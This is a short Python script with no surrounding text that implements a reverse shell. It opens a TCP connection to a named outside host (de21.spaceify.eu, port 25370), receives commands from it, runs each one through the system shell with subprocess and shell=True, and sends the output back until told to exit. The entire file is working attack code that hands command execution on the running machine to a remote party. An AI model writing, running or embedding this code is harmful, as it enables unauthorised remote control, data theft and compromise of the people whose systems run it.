import socket
import subprocess

host = "de21.spaceify.eu"
port = 25370
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    cmd = client.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except Exception as e:
        output = str(e).encode()
    client.send(output)

client.close()
